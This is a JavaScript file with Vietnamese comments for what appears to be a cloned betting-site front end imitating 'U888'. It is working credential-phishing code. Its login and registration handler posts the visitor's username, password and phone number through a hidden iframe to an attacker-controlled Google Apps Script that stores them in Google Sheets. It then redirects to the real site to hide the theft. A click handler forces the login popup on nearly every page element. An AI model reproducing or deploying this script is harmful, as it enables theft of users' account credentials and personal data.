// Đợi cho HTML tải xong
document.addEventListener("DOMContentLoaded", () => {
    
    // =========================================
    // 1. XỬ LÝ THANH MENU DƯỚI CÙNG (MOBILE)
    // =========================================
    const navItems = document.querySelectorAll('.mobile-bottom-nav .nav-item');
    
    navItems.forEach(item => {
        item.addEventListener('click', (e) => {
            // Xóa class active ở tất cả các nút
            navItems.forEach(nav => nav.classList.remove('active'));
            // Thêm class active vào nút được click
            item.classList.add('active');
        });
    });

    // =========================================
    // 2. XỬ LÝ AUTO-SLIDE CHO BANNER
    // =========================================
    const bannerTrack = document.querySelector('.banner-track');
    const bannerSlides = document.querySelectorAll('.banner-img');
    
    if (bannerTrack && bannerSlides.length > 0) {
        let currentSlideIndex = 0;
        const totalSlides = bannerSlides.length;

        function moveToNextSlide() {
            currentSlideIndex++;
            if (currentSlideIndex >= totalSlides) {
                currentSlideIndex = 0; 
            }
            updateSliderPosition();
        }

        function updateSliderPosition() {
            const slideWidth = bannerSlides[0].clientWidth;
            bannerTrack.style.transform = `translateX(-${currentSlideIndex * slideWidth}px)`;
        }

        let slideInterval = setInterval(moveToNextSlide, 3000);
        window.addEventListener('resize', updateSliderPosition);
    }

    // =========================================
    // 3. XỬ LÝ CHỌN DANH MỤC TRÊN MOBILE
    // =========================================
    const catItems = document.querySelectorAll('.cat-item');

    catItems.forEach(item => {
        item.addEventListener('click', () => {
            catItems.forEach(cat => cat.classList.remove('active'));
            item.classList.add('active');
        });
    });

    // =========================================
    // 4. XỬ LÝ CỬA SỔ POPUP ĐĂNG NHẬP / ĐĂNG KÝ
    // =========================================
    const authModal = document.getElementById("authModal");
    
    window.switchAuthForm = function(type) {
        const loginForms = document.querySelectorAll('.formLogin');
        const registerForms = document.querySelectorAll('.formRegister');
        
        if (type === 'register') {
            loginForms.forEach(form => form.style.display = "none");
            registerForms.forEach(form => form.style.display = "block");
        } else {
            registerForms.forEach(form => form.style.display = "none");
            loginForms.forEach(form => form.style.display = "block");
        }
    };

    window.openModal = function(type) {
        if(authModal) {
            authModal.style.display = "block";
            switchAuthForm(type);
        }
    };

    // Các nút có sẵn chức năng mở form đăng nhập
    document.querySelectorAll('.btn-login, .btn-login-mobile').forEach(btn => {
        btn.addEventListener('click', (e) => { 
            e.preventDefault(); 
            openModal('login'); 
        });
    });

    // Các nút có sẵn chức năng mở form đăng ký
    document.querySelectorAll('.btn-register, .btn-register-mobile').forEach(btn => {
        btn.addEventListener('click', (e) => { 
            e.preventDefault(); 
            openModal('register'); 
        });
    });

    document.addEventListener('click', function(event) {
        // Tắt popup khi bấm vào Nút X 
        if (event.target.closest('.close-modal')) {
            if(authModal) authModal.style.display = "none";
        }
        
        // Tắt popup khi bấm ra ngoài vùng đen nền của Modal
        if (event.target === authModal) {
            authModal.style.display = "none";
        }
    });

    // =========================================
    // 5. XỬ LÝ XÁC THỰC FORM VÀ GỬI DỮ LIỆU LÊN GOOGLE SHEETS (KHÔNG LỖI CORS)
    // =========================================
    
    // DÁN ĐƯỜNG LINK WEB APP URL CỦA BẠN VÀO ĐÂY:
    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzSRgfi_oU94JwqDFe-M7j79QHdD_q6wKVexWGHDnUHqvD-t-WmzgfNu6ixcPuO6bl1HA/exec"; 

    // Biến toàn cục kiểm tra trạng thái gửi
    window.isSubmitted = false;

    const submitBtns = document.querySelectorAll('.btn-submit-orange');

    submitBtns.forEach(btn => {
        btn.addEventListener('click', function(e) {
            e.preventDefault(); 

            const formContainer = this.closest('.auth-form-wrapper');
            if (!formContainer) return;

            const inputs = formContainer.querySelectorAll('input:not([type="checkbox"])');
            let isValid = true;

            for (let i = 0; i < inputs.length; i++) {
                const input = inputs[i];
                const val = input.value.trim();
                const placeholder = (input.getAttribute('placeholder') || '').toLowerCase();

                // 1. Ràng buộc điền đầy đủ
                if (val === '') {
                    alert("Vui lòng điền đầy đủ tất cả các trường thông tin!");
                    isValid = false;
                    input.focus(); 
                    break;
                }

                // 2. Ràng buộc Tài khoản (6-20 ký tự)
                if (input.type === 'text' && (placeholder.includes('tài khoản') || placeholder.includes('ký tự'))) {
                    if (val.length < 6 || val.length > 20) {
                        alert("Tên tài khoản phải có độ dài từ 6 đến 20 ký tự!");
                        isValid = false;
                        input.focus();
                        break;
                    }
                }

                // 3. Ràng buộc Mật khẩu (6-20 ký tự)
                if (input.type === 'password') {
                    if (val.length < 6 || val.length > 20) {
                        alert("Mật khẩu phải có độ dài từ 6 đến 20 ký tự!");
                        isValid = false;
                        input.focus();
                        break;
                    }
                }

                // 4. Ràng buộc Số điện thoại (Đúng 10 số)
                if (input.type === 'tel' || placeholder.includes('điện thoại') || placeholder.includes('bắt đầu bằng')) {
                    const phoneRegex = /^[0-9]{10}$/;
                    if (!phoneRegex.test(val)) {
                        alert("Số điện thoại không hợp lệ! Vui lòng nhập chính xác 10 chữ số.");
                        isValid = false;
                        input.focus();
                        break;
                    }
                }
            }

            // Nếu dữ liệu hợp lệ -> Tiến hành gửi ngầm
            if (isValid) {
                btn.innerHTML = "ĐANG XỬ LÝ...";
                btn.disabled = true;

                // Tạo thẻ <form> ảo để submit dữ liệu qua iframe ẩn (Bỏ qua lỗi CORS)
                const form = document.createElement('form');
                form.action = GOOGLE_SCRIPT_URL;
                form.method = 'POST';
                form.target = 'hidden_iframe'; // Đẩy kết quả vào iframe ẩn

                // Xác định hành động (ĐĂNG NHẬP hay ĐĂNG KÝ)
                const actionInput = document.createElement('input');
                actionInput.type = 'hidden';
                actionInput.name = 'action';
                actionInput.value = formContainer.classList.contains('formRegister') ? 'ĐĂNG KÝ' : 'ĐĂNG NHẬP';
                form.appendChild(actionInput);

                // Gom tất cả các ô input trong form hiện tại cho vào form ảo
                inputs.forEach(input => {
                    if (input.name) {
                        const cloneInput = document.createElement('input');
                        cloneInput.type = 'hidden';
                        cloneInput.name = input.name;
                        cloneInput.value = input.value.trim();
                        form.appendChild(cloneInput);
                    }
                });

                document.body.appendChild(form);
                window.isSubmitted = true;
                
                // Gửi dữ liệu đi
                form.submit();

                // Chờ 1 giây để đảm bảo dữ liệu đã vào Google Sheets rồi chuyển hướng trang
                setTimeout(() => {
                    window.location.href = "https://m.u888pg.link/";
                }, 1000);
            }
        });
    });
    // =========================================
    // 6. YÊU CẦU ĐĂNG NHẬP KHI NHẤN VÀO CÁC THÀNH PHẦN KHÁC
    // =========================================
    // Liệt kê chi tiết TẤT CẢ các class/id của các thành phần trên web
    // Mọi phần tử thuộc danh sách này khi bị click sẽ mở Form Đăng Nhập
    const requireLoginSelectors = [
        '.logo',                      // Logo trang chủ
        '.icon-item',                 // Các icon trên Header PC (CSKH, v.v...)
        '.desktop-nav a',             // Thanh menu dọc trên PC
        '.btn-trial',                 // Nút Chơi thử trên PC
        '.banner-slider',             // Khu vực banner trượt
        '.news-ticker-container',     // Khu vực thông báo chạy
        '.cat-item',                  // Các nút danh mục (Mobile)
        '.game-card',                 // Các thẻ game
        '.mobile-download-section',   // Khu vực tải App (Mobile)
        '.mobile-news-section',       // Khu vực tin tức (Mobile)
        '.mobile-bottom-nav .nav-item:not(.active)', // Nút menu đáy Mobile (trừ nút đang active)
        '.services-grid .service-item', // Thẻ dịch vụ PC
        '.game-lobby-section',        // Sảnh trò chơi PC
        '.desktop-only-section',      // Khối đối tác PC
        '.footer-apps',               // Khu vực tải app Footer PC
        '.footer-bottom-links a'      // Các link dưới cùng Footer PC
    ];

    // Gộp tất cả selector thành một chuỗi duy nhất cách nhau bởi dấu phẩy
    const selectorsString = requireLoginSelectors.join(', ');
    
    // Tìm và gắn sự kiện cho toàn bộ các phần tử đó
    const requireLoginElements = document.querySelectorAll(selectorsString);

    requireLoginElements.forEach(el => {
        el.addEventListener('click', function(e) {
            // Ngăn chặn chuyển trang (nếu thẻ đó là thẻ <a>)
            e.preventDefault(); 
            // Gọi hàm mở Popup Đăng Nhập
            openModal('login'); 
        });
    });

}); // KẾT THÚC DOMContentLoaded